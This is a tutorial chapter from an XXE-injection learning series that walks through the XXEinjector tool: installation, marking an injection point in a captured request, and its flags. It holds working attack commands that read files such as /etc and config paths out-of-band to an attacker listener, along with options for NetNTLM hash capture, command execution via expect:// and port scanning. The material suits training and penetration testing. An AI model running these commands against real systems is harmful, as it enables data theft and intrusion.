# 06 — XXEinjector: Automation Tool Deep Dive

## Real-World Framing

Unlike SQL injection (sqlmap), command injection (commix), or NoSQL injection
(NoSQLMap), there is no single dominant, universally-adopted XXE automation tool that
the entire industry standardizes on. The closest equivalent is **XXEinjector** (Ruby,
by `enjoiz`, widely forked) — it automates the repetitive parts of blind/OOB XXE
exploitation (the DTD-builder boilerplate from file 3) given a captured HTTP request,
but it is not a scanner: it still requires you to have already found and confirmed an
XXE injection point manually, the same way sqlmap requires you to point it at a
parameter that's already suspected to be injectable. Treat this tool as a force
multiplier for exploitation speed and file/path enumeration, not as a discovery tool.

## Installation

```bash
git clone https://github.com/enjoiz/XXEinjector.git
cd XXEinjector
ruby XXEinjector.rb --help
```

It's a single Ruby script with no heavyweight dependency chain — no `bundle install`
step needed for the core functionality.

## Core Workflow

XXEinjector operates against a **captured raw HTTP request file** (the same kind of
file you'd save from Burp Suite via "Copy to file" or "Save item"), not against a bare
URL. You mark the injection point in that file with the literal string `XXEINJECT`,
and XXEinjector builds the DTD/entity payload around that marker automatically.

### Step 1: Capture and Prepare the Request File

Intercept the vulnerable request in Burp, save it to a file, and replace the value
you want to inject into with the literal marker:

```
POST /product/stock HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/xml
Content-Length: 50

<?xml version="1.0"?><stockCheck><productId>XXEINJECT</productId></stockCheck>
```

- `XXEINJECT` here is not magic XML syntax — it is a plain string token that
  XXEinjector's own code searches for and replaces with its generated `DOCTYPE`/entity
  block before sending. This is exactly equivalent to manually swapping in
  `<!DOCTYPE foo [...]>...&xxe;` by hand, as done throughout files 2–3, except the tool
  generates and substitutes it for you across many requests.

### Step 2: Mandatory Flags

| Flag | Purpose |
|---|---|
| `--host` | **Mandatory.** Your IP address, used for OOB reverse connections (FTP by default, the tool's own listener). |
| `--file` | **Mandatory.** Path to the saved HTTP request file containing the `XXEINJECT` marker. |
| `--path` | Mandatory if enumerating a directory — the directory to enumerate (e.g. `/etc`). |
| `--brute` | Mandatory if brute-forcing specific filenames instead of enumerating a whole directory — a wordlist file of paths to try. |

### Step 3: Basic Directory Enumeration Example

```bash
ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --ssl
```

- `--host=192.168.0.2` — your attacking machine's IP, where XXEinjector spins up its
  own listener (FTP by default) to receive the OOB callback the target server makes —
  conceptually identical to the `evil.dtd`-hosting server from file 3, except
  XXEinjector hosts and serves the equivalent payload automatically rather than you
  writing the DTD by hand.
- `--path=/etc` — tells the tool to attempt directory listing of `/etc` on the target.
  Important real-world caveat: **directory listing only works against Java
  applications** specifically (because the technique relies on a Java-specific parser
  quirk where attempting to load a directory as an external entity returns a listing).
  Against non-Java back-ends (PHP, .NET, Python, etc.), this flag silently won't
  produce useful results — you need `--brute` with a filename wordlist instead.
- `--file=/tmp/req.txt` — the captured request with the `XXEINJECT` marker.
- `--ssl` — tells the tool the target request should be sent over HTTPS rather than
  plain HTTP.

### Step 4: Brute-Forcing Specific Files (Non-Java Targets)

```bash
ruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt --file=/tmp/req.txt --oob=http
```

- `--brute=/tmp/filenames.txt` — a wordlist of candidate file paths (e.g.
  `/etc/passwd`, `/etc/hosts`, `C:\Windows\win.ini`, application config paths like
  `/var/www/html/config.php`) that the tool will attempt to read one at a time using the
  parameter-entity OOB chain, reporting back which ones succeeded.
- `--oob=http` — selects HTTP as the out-of-band exfiltration channel instead of the
  FTP default. The tool documents three OOB channel options: `ftp` (default, works
  against virtually any application), `http` (useful specifically for bruteforcing and
  for directory-listing-style enumeration against older Java applications), and
  `gopher` (Java-specific, and only relevant against old Java versions below 1.7).
  Picking the right one matters because some target environments allow outbound FTP but
  block outbound HTTP, or vice versa — worth trying more than one if the first produces
  no callbacks.

### Step 5: Direct (In-Band) Exploitation Mode

If the application is **not** blind — i.e., the resolved entity value is reflected
somewhere in the HTTP response, as in file 2's classic technique — XXEinjector can skip
the OOB dance entirely and read the value straight out of the response body:

```bash
ruby XXEinjector.rb --file=/tmp/req.txt --path=/etc --direct=UNIQUEMARKSTART,UNIQUEMARKEND
```

- `--direct=UNIQUEMARKSTART,UNIQUEMARKEND` — you specify two literal strings that you
  manually wrap around the reflected value in the request's expected response context
  so the tool knows where in the noisy HTTP response body the actual file content
  starts and ends. This mirrors exactly how you'd visually spot the reflected value in
  Burp's response pane during manual testing — the tool just needs explicit delimiters
  to parse it automatically across many requests.
- This mode is dramatically faster than OOB for in-band-capable targets since no
  external listener round-trip is needed per request — it's a single request/response
  cycle.

### Step 6: Other Frequently Used Flags

| Flag | Purpose |
|---|---|
| `--2ndfile` | For **second-order XXE**: the injection happens in one request, but the file read result only shows up later, in the response to a *different* request (e.g. an admin panel that later displays a previously-submitted XML import). You provide a second request file describing where to look for the result. |
| `--enumports=all` (or a comma list) | Reuses the XXE/SSRF primitive (file 4's technique) to enumerate which TCP ports on a target are open, by triggering an OOB connection attempt per port and timing the response. |
| `--hashes` | Attempts to coerce the vulnerable (typically Windows/.NET) server into making an SMB-style request back to your host, capturing NetNTLM hash material — an XXE-driven variant of the classic "force outbound SMB auth" credential-theft technique. |
| `--upload=/tmp/file.pdf` | Uses the Java `jar:` URI scheme trick to write an uploaded file to a temp path on the target — Java-specific, and relies on quirks of how Java resolves `jar:http://...!/` URIs. |
| `--phpfilter` | Wraps file reads using PHP's `php://filter/convert.base64-encode/resource=` wrapper, useful for safely exfiltrating binary or non-UTF8 file content through channels that would otherwise corrupt it — directly related to the well-known "read PHP source code via base64 filter" trick. |
| `--expect=ls` | Uses PHP's (rarely-installed) `expect://` wrapper to execute an OS command directly, when present — escalates file-read XXE into command execution on PHP targets where this extension happens to be enabled. |
| `--rhost` / `--rport` | Override the target host/port when the captured request file doesn't include a usable `Host` header (e.g. it was sent through a load balancer or proxy that rewrote it). |
| `--logger` | Passive mode — doesn't send any requests, just listens and logs incoming OOB connections, useful for confirming a payload you crafted and sent manually elsewhere actually triggered a callback. |
| `--test` | Dry-run: shows you the exact request XXEinjector *would* send with the payload injected, without sending it — useful for sanity-checking the generated DTD/entity chain against what you learned manually in files 2–3 before firing it at a real target. |

## What XXEinjector Automates vs. What It Cannot Replace

### What it automates well

- Generating the parameter-entity DTD-builder boilerplate (`%file` → `%eval` →
  `%exfil`/`%error` chain from file 3) correctly every time, with no risk of a stray
  unescaped `%` breaking the payload.
- Spinning up and managing the OOB listener (FTP/HTTP/Gopher) so you don't need
  separate Burp Collaborator/`interactsh` infrastructure for simple file-read tasks.
- Iterating a wordlist of candidate file paths or a directory listing far faster than
  manual Repeater requests one at a time.
- Reusing the XXE-as-SSRF primitive for port enumeration (file 4) without hand-writing
  a script to iterate ports.

### What still requires the manual understanding from files 2–4

- **Initial discovery and confirmation.** XXEinjector assumes you already know which
  parameter/request is XXE-injectable; it does not crawl an application looking for
  XML attack surface, hidden content-type-coercion endpoints, or XInclude-only injection
  points (file 2). That reconnaissance step is entirely manual.
- **Non-standard payload contexts.** XInclude attacks, SVG/file-upload-based XXE, and
  content-type coercion (file 2, Techniques 3–5) fall outside XXEinjector's core
  `XXEINJECT`-in-an-HTTP-request model, since those attack paths don't necessarily
  involve a `DOCTYPE` you inject into a request body at all.
- **Repurposing a local DTD for hardened, egress-filtered targets** (file 3's most
  advanced technique). XXEinjector has some support for local-DTD-based direct
  exploitation, but successfully identifying *which* local DTD file exists on a given
  target and which of its entities are safe to redefine is still a manual research step
  specific to that target's OS/environment.
- **Judgment about impact and chaining**, e.g. recognizing that an SSRF-capable XXE
  should be pushed toward cloud metadata endpoints (file 4) — the tool gives you a
  generic SSRF/file-read primitive; deciding what to do with it strategically during an
  engagement is still on you.
- **Reporting.** No automation tool writes your findings report; you still need to
  understand exactly why each payload worked (the DOCTYPE/entity mechanics from files
  1–3) to explain root cause and remediation credibly to a client or in a bug bounty
  submission.

## Real-World Note

Many real engagements never touch XXEinjector at all — Burp Suite Repeater plus a
Collaborator client covers a large share of practical blind XXE work manually, and
some testers prefer that level of manual control specifically because it forces them to
understand exactly what's happening at each step. XXEinjector earns its place when
you're enumerating large file/directory spaces or running repetitive brute-force-style
exploitation where doing it by hand in Repeater would be impractically slow.

## What's Next

File 7 is the standing reference: a condensed payload cheatsheet covering every
technique in this series, plus the complete PortSwigger Web Security Academy lab list
mapped in the exact Apprentice → Practitioner → Expert progression order, so you always
know which lab corresponds to which file and technique.
